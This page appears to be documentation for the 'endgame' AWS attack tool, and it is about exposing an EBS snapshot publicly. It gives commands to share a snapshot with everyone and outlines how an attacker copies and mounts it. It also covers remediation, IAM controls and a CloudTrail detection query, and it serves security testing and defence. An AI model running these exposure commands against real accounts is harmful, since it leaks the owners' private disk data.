# EBS Snapshot Exposure

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=*
export SNAPSHOT_ID=snap-1234567890abcdef0

endgame expose --service ebs --name $SNAPSHOT_ID
```

* To expose the resource using the AWS CLI, run the following from the victim account:

```bash
export SNAPSHOT_ID=snap-1234567890abcdef0

aws ec2 modify-snapshot-attribute \
    --snapshot-id $SNAPSHOT_ID \
    --attribute createVolumePermission \
    --operation-type add \
    --group-names all
```

* To verify that the snapshot has been shared with the public, run the following from the victim account:

```bash
export SNAPSHOT_ID=snap-1234567890abcdef0

aws ec2 describe-snapshot-attribute \
    --snapshot-id $SNAPSHOT_ID \
    --attribute createVolumePermission
```

* Observe that the contents match the example shown below.

## Example

The response of `aws ec2 describe-snapshot-attribute` will match the below, indicating that the EBS snapshot is public.

```json
{
    "SnapshotId": "snap-066877671789bd71b",
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ]
}
```

## Exploitation

After an EBS Snapshot is made public, an attacker can then:
* [copy the public snapshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-snapshot.html) to their own account
* Use the snapshot to create an EBS volume
* Attach the EBS volume to their own EC2 instance and browse the contents of the disk, potentially revealing sensitive or otherwise non-public information.

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Encrypt all Snapshots with Customer-Managed Keys**: Follow the encryption-related recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#use-aws-kms-customer-managed-keys)
* **Trusted Accounts Only**: Ensure that EBS Snapshots are only shared with trusted accounts, and that the trusted accounts truly need access to the EBS Snapshot.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your EBS Snapshots**: Tightly control access to the following IAM actions:
      - [ec2:ModifySnapshotAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_ModifySnapshotAttribute.html): _Grants permission to add or remove permission settings for a snapshot_
      - [ec2:DescribeSnapshotAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSnapshotAttribute.html): _Grants permission to describe an attribute of a snapshot. This includes information on which accounts the snapshot has been shared with._
      - [ec2:DescribeSnapshots](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeSnapshots.html): _Grants permission to describe one or more EBS snapshots_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='ec2.amazonaws.com' and (eventName='ModifySnapshotAttribute' and requestParameters.attributeType='CREATE_VOLUME_PERMISSION') 
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [Sharing an Unencrypted Snapshot using the Console](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html#share-unencrypted-snapshot)
* [Share a snapshot using the command line](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html)
* [aws ec2 copy-snapshot](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-snapshot.html)